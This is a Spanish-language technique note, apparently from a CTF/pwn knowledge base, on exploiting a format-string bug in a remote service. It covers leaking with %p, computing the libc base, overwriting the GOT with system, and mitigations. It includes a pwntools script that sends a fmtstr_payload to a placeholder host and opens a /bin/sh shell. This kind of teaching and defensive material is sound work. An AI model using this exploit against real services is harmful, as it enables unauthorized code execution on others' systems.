---
topic: Cadena de formato en un servicio remoto
tags: [pwn, format-string, got, remote, exploit]
---

# Cadena de formato en un servicio remoto

[🌐 English](remote-format-string-service.en.md) | **Español**

## Concepto

Si un servicio de red pasa datos del cliente a `printf` como formato, se pueden leer direcciones de la pila y escribir memoria con `%n`. En un binario sin PIE se apunta a la GOT para sustituir una función por `system`.

## Cuándo aplica

- El servicio ecoa o registra la entrada con `printf(input)`.
- El binario no tiene PIE o se filtra una dirección de libc.
- Existe una llamada posterior a `puts`, `printf` o `strlen`.

## Procedimiento

1. Enviar `%p` repetidos y localizar la posición del buffer.
2. Filtrar la dirección de `puts` en la GOT o en la pila.
3. Calcular la base de libc y la dirección de `system`.
4. Escribir `system` con `%n` en dos mitades y disparar la llamada.

```python
from pwn import *
p = remote('<IP>', 9999)
p.sendline(b'%p.' * 20)
leak = p.recvline()
# localizar el offset del buffer y la dirección de puts
# escribir system en la GOT con fmtstr_payload
payload = fmtstr_payload(offset, {puts_got: system_addr})
p.sendline(payload)
p.sendline(b'; /bin/sh')
p.interactive()
```

## Variantes

- Sobrescribir `__stack_chk_fail` o un puntero de retorno.
- Usar `%s` para leer memoria arbitraria.
- Encadenar con un ROP si la GOT es de solo lectura.

## Limitaciones

- El offset debe ser estable.
- Full RELRO impide escribir la GOT.
- La longitud del payload puede estar limitada.

## Mitigación y detección

- Usar `printf("%s", input)` y `-Wformat-security`.
- Compilar con Full RELRO, PIE y NX.
- Validar y limitar la entrada de red.

## Referencias

- <https://owasp.org/www-community/attacks/Format_string_attack>
- <https://ir0nstone.gitbook.io/notes/types/stack/format-string>
- <https://attack.mitre.org/techniques/T1203/>
